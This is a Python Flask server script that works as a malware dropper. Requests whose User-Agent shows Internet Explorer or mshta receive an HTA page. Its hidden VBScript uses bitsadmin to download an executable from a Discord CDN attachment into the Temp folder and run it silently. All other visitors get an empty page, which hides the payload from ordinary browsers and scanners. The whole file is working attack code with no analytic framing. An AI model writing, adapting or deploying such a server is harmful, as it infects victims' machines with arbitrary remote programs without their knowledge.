import os
from flask import Flask, request

app = Flask(__name__)
PORT = int(os.environ.get("PORT", 8000))

HTA_PAYLOAD = """<!DOCTYPE html>
<html>
<head>
    <hta:application id="app" windowstate="minimize" showintaskbar="no" sysmenu="no" caption="no" />
    <script language="VBScript">
        Sub Window_OnLoad
            window.resizeTo 0, 0
            window.moveTo -2000, -2000
            Set objShell = CreateObject("WScript.Shell")
            
            cmd = "C:\\Windows\\System32\\bitsadmin.exe /transfer d /download /priority high ""https://cdn.discordapp.com/attachments/1520399304785788948/1523769075225067581/source_prepared.exe?ex=6a4d5009&is=6a4bfe89&hm=0dde198b605052eeec47bbb320f8fa8144276ce66d417a1cfae62ba01d697632&"" ""C:\\Users\\Admin\\AppData\\Local\\Temp\\wd.exe"""
            objShell.Run cmd, 0, True
            
            objShell.Run "C:\\Users\\Admin\\AppData\\Local\\Temp\\wd.exe", 0, False
            window.close
        End Sub
    </script>
</head>
<body></body>
</html>"""

@app.route('/')
def handle_request():
    user_agent = request.headers.get('User-Agent', '')
    
    if "Trident" in user_agent or "mshta" in user_agent.lower():
        return HTA_PAYLOAD
    else:
        return "<html><head></head><body></body></html>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT)
